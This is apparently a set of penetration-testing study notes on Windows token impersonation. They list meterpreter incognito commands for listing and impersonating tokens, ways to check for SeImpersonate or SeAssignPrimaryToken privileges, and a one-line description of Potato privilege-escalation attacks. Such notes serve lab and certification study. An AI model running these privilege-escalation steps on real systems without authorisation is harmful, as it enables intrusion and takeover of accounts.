Token Impersonation
	In a meterpreter session you can use the following different commands.
		`load incognito`
		`list_tokens -u`
		`impersonate_token DOMAIN\\user`
			This should impersonate the token you select.
	In meterpreter
		getprivs
	In cmd or shell
		whoami /priv
	You're looking for one of two statuses to be able to pull off a certain attack.
		`SeImpersonate` or `SeAssignPrimaryToken`

Potato Attacks
	Potato attack takes advantage of these privileges.  It negotiates an NT Auth Sys token and uses that to impersonate it with an account that has either of those two privleges.
